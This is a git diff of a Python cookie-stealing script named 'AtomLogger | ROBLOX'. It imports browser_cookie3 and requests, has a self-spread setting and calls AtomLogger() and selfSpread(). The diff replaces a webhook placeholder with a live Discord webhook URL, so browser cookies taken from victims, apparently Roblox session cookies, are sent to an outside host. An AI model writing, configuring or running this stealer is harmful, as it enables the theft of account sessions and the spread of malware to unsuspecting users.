@@ -1,7 +1,7 @@
 import browser_cookie3, requests, urllib, re, os
 
 #   Settings - Webhook    #
-webhook = 'WEBHOOK URL HERE'
+webhook = 'https://discord.com/api/webhooks/1435321157275615252/r4_3XXqEKex4nFwwWwal_acy7-TLPKW1frrduwGY9LzJHIHyYd6G-mKP3uXvEuOIthOd'
 avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
 botName = 'AtomLogger | ROBLOX'
 #   Settings - Self Spread    #
@@ -95,3 +95,4 @@ def AtomLogger():
 if __name__ == '__main__':
     AtomLogger()
     selfSpread()
+
